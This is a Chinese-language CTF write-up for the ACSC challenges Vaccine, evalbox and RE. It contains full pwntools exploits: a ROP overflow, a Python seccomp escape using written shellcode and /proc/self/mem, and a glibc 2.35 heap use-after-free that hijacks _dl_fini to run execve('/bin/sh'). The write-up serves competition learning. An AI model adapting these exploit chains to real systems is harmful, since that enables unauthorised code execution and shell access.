## Vaccine

```
#  checksec ./vaccine
[*] '/docker_vol/acsc/vaccine/bin/vaccine'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- `scanf()` 可以讀 `'\x00'`
- default 為 full buf / line buf，需要 `fflush()`



```python
#!/usr/bin/python3

from pwn import *
from sys import argv
import time

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(argv) > 1:
    r = remote('vaccine.chal.ctf.acsc.asia', 1337)
else:
    r = process('./vaccine')

rop_pop_rdi_ret = 0x401443
rop_pop_rsi_r15_ret = 0x401441
rop_ret = 0x40101a

plt_scanf = 0x4010a0

addr_R = 0x403008
addr_flag_str = 0x404200
addr_stack = 0x404f00
addr_main = 0x401236
addr_main_scanf = 0x4012AC
addr_main_fget_gadget = 0x401375
addr_main_fflush = 0x401293

payload =  b'\x00' * (112 + 104 + 8 + 8)
payload += b'\x00' * 0x18 # padding ?
payload += p64(addr_stack) # old rsp

rop = flat(
    rop_pop_rsi_r15_ret, addr_flag_str, 0,
    rop_ret,
    addr_main_scanf,
)

padding = b'A' * 0x180 + p64(addr_stack)
rop2 = flat(
    rop_pop_rdi_ret, addr_flag_str,
    rop_pop_rsi_r15_ret, addr_R, 0,
    addr_main_fget_gadget,
    addr_main_fflush,
)

padding2 = b'A' * 0x180 + p64(addr_main_fflush)
r.sendlineafter('Give me vaccine: ', payload + rop + padding + rop2 + padding2)
input()
r.sendline("flag.txt\x00")
r.interactive()
# ACSC{RoP_3@zy_Pe4$y}
```





## evalbox

python 加上了 sys_close 的 kill seccomp rule，雖然可以讀取檔案，但是我們不知道檔案名，並且很多操作都會間接呼叫到 sys_close，包含 `os.scandir()` 等等。

而第一個需要解決的是一次只能執行一行的問題，並且 `eval()` 本身不能 assign variable，然而這部分可以透過 `exec(input()), exec(input()), ...` 來繞過，`exec()` 可以 assign variable，並且 `,` 隔開可以多次執行。

我取得 flag 的方法為在可執行的目錄底下建一個檔案，並且透過 file operation 使其變成執行，最後寫入 shellcode 後直接 `execve()` 該檔案。雖然在 `execve()` 前會呼叫到 sys_close，但可以透過 remote container 檔案能夠殘留於目錄來繞過，以下為 exploit，註解分別標記三個步驟：

```python
#!/usr/bin/python3

from pwn import *
from sys import argv

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(argv) > 1:
    r = remote('evalbox-2.chal.ctf.acsc.asia', 9341)
    # r = remote('localhost', 9341)
else:
    r = process(['/usr/bin/python3', './app.py'])

shellcode = open("./a.out", "rb").read().hex()
payloads = [
    ##### part 1 - write shellcode to executable path
    # "__import__('os').umask(0)",
    # "path = '/run/lock/qq'",
    # "flags = __import__('os').O_WRONLY | __import__('os').O_CREAT | __import__('os').O_TRUNC | __import__('os').O_CLOEXEC",
    # "mode = 0o777",
    # "d = __import__('os').open(path=path, flags=flags, mode=mode)",

    # "f = open(d, 'wb')",
    # f"f.write(bytes.fromhex('{shellcode}'))",


    ##### part 2 - exec shellcode
    # "__import__('os').execve('/run/lock/qq', ['/run/lock/qq'], {})",

    ##### part 3 - read flag
    "f = open('flag-0479f1dcda629bbe833598bce876a647.txt', 'r')",
    "print(f.read())",
]

magic = 'exec(input()),'
all_magic = magic * len(payloads)

r.sendlineafter('code: ', all_magic)

for payload in payloads:
    r.sendline(payload)
    
r.interactive()

# ACSC{bl4ckL1st_ruL3_1s_4lw4y5_d4ng3r0uS!}
```

a.out 的原始碼為下：

```asm
          global    _start
          section   .text

_start:
    ; open("/home/ctf")
    lea rdi, [home_path]
    mov rsi, 0
    xor rdx, rdx
    mov rax, 2
    syscall

    ; getdirents("/home/ctf")
    mov rdi, rax
    lea rsi, [rsp + 0x100]
    mov rdx, 0x300
    mov rax, 78
    syscall

    mov rdi, 1
    lea rsi, [rsp + 0x100]
    mov rdx, 0x300
    mov rax, 1
    syscall

    mov rdi, 0
    mov rax, 60
    syscall
          section   .data
home_path:  db        "/home/ctf"
```



---

賽後討論區中有許多其他解法可以參考，同時也有其他可以一次執行多行 python code 的作法，包含：

1. 出題者 (ptr-yudai) 預期解 - 透過 `/proc/self/maps` leak address，修改 `/proc/self/mem` 寫 shellcode

```python
code = f"""
all(map(
 lambda fs: [
  fs[1].seek(int(fs[0].read(12),16)+0x18ebb8,0),
  fs[1].write(bytes.fromhex("{shellcode.hex()}")),
  fs[1].flush(),
  input()
 ],
 [(open("/proc/self/maps"), open("/proc/self/mem", "wb"))]
))
""".replace("\n", "")
```

2. splitline - one-liner

```python
print(os:=__import__('os'),d:=os.scandir(os.open(".",0)),f:=open(next(d).name),f.read())
```

- 不確定為什麼不會觸發 close，當初在測試時 `scandir()`

另外 maple 有提供一篇 python seccomp bypass 的 CTF 題目 [35c3ctf: Collection - an Unintended Solution!](https://www.da.vidbuchanan.co.uk/blog/35c3ctf-collection-writeup.html)，後續類似題目可以參考。



## RE

Heap 題，提供了 `realloc()` 做 malloc 與 free，程式設計中有明顯的 UAF，不過 `read()` 會 append 一個 NULL byte，並且分配的數量有限制。以下為利用流程：

1. UAF leak heap address
2. 構造 unsorted bin leak library address
3. 任意寫位址控制執行流程

比較麻煩的是執行環境為 glibc 2.35，因此沒有 hook 可以用，比賽過程中我嘗試蓋寫 libc 的 GOT 來控制執行流程，不過 one gadget 的條件不滿足，並且 stack 與相關 register 都不可控。

賽後參考 https://uz56764.tistory.com/87 在 `_dl_fini()` 找到的方式，也滿足 one gadget 的使用條件：

```
=> 0x15555552021a <_dl_fini+474>:       mov    rax,QWORD PTR [rax+0x8]
   0x15555552021e <_dl_fini+478>:       add    rax,QWORD PTR [r15]
   0x155555520221 <_dl_fini+481>:       mov    rsi,rax
   0x155555520224 <_dl_fini+484>:       mov    QWORD PTR [rbp-0x40],rax
   0x155555520228 <_dl_fini+488>:       mov    rax,QWORD PTR [r15+0x120]
   0x15555552022f <_dl_fini+495>:       mov    rdx,QWORD PTR [rax+0x8]
   0x155555520233 <_dl_fini+499>:       shr    rdx,0x3
   0x155555520237 <_dl_fini+503>:       lea    eax,[rdx-0x1]
   0x15555552023a <_dl_fini+506>:       lea    rax,[rsi+rax*8]
   0x15555552023e <_dl_fini+510>:       test   edx,edx
   0x155555520240 <_dl_fini+512>:       je     0x15555552025f <_dl_fini+543>
   0x155555520242 <_dl_fini+514>:       nop    WORD PTR [rax+rax*1+0x0]
   0x155555520248 <_dl_fini+520>:       mov    QWORD PTR [rbp-0x38],rax
   0x15555552024c <_dl_fini+524>:       call   QWORD PTR [rax]
```

- L1 - rax 會是 0x3d90 定值
- L2 - r15 會是 ld 的 .data，因此可寫
  - 原本的值會是 `__do_global_dtors_aux_fini_array_entry[]`，為 binary 的 fini array
  - 該變數為會是一個 function pointer array，儲存 binary destructor
- L5~L7 - 取出 fini array 一共有多少個 element，預設為 1
- L14 - 呼叫對應的 function pointer

也就是說，在 ld.data 中寫入 **heap - 0x3d90**，就會呼叫 **[heap]**，這時如果使用下面的 one gadget，雖然 `$rbp - 0x70` 不會是 NULL，但是該位址會是一連串合法的 pointer，最後緊接著 NULL，因此還是可以滿足條件：

```
0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
```



以下為 exploit：

```python
#!/usr/bin/python3

from pwn import *
from sys import argv

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(argv) > 1:
    r = remote('re.chal.ctf.acsc.asia', 9999)
else:
    r = process('./re', aslr=False)

def edit(idx, size, data):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Index: ', str(idx))
    r.sendlineafter('Size: ', str(size))
    if len(data) != 0:
        r.sendafter('Memo: ', data)

def show():
    r.sendlineafter('> ', '2')

def mangle(ptr, addr):
    return p64(ptr ^ (addr >> 12))

edit(0, 0x78, 'A')
edit(0, 0x0, '')
edit(1, 0x78, 'A')
edit(0, 0x0, '')
show()
r.recvuntil('[1] ')
heap = u64(r.recv(5).ljust(8, b'\x00')) << 12
info(f"heap: {hex(heap)}")

for i in range(4):
    edit(1, 0x78, b'A' * 0x10)
    edit(0, 0x0, b'')

fake_chunk_list = flat(
    mangle(heap + 0x2c0, heap + 0x2a0), b'A' * 8,
    0, 0x78,
    mangle(heap + 0x6c0, heap + 0x2c0), b'B' * 8,
    0, 0x78,
)
edit(1, 0x78, fake_chunk_list)
edit(2, 0x78, b'A')
edit(3, 0x78, b'B') # victim
edit(4, 0x78, p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21)) # fake chunk
edit(2, 0x78, b'\x00' * 0x18 + p64(0x421))
edit(5, 0x58, b'C')
edit(3, 0x0, b'')
edit(6, 0x58, b'D')
show()
r.recvuntil('[5] ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x219ce0
target = libc + 0x2702e0
oneshot = libc + 0xebcf1
info(f"libc: {hex(libc)}")

for i in range(2):
    edit(1, 0x78, b'A' * 0x10)
    edit(0, 0x0, b'')

fake_chunk_list = flat(
    mangle(target, heap + 0x2a0), b'A' * 8,
    0, 0x78,
)
edit(1, 0x78, fake_chunk_list)
edit(7, 0x78, p64(oneshot))

addr_function_table = heap + 0x2a0 - 0x3d90
edit(9, 0x78, p64(addr_function_table))

gdb.attach(r)
r.interactive()
```



---

glibc 2.35 heap exploit control code execution 的方法可以參考：https://chovid99.github.io/posts/acsc-2023/#gain-code-execution
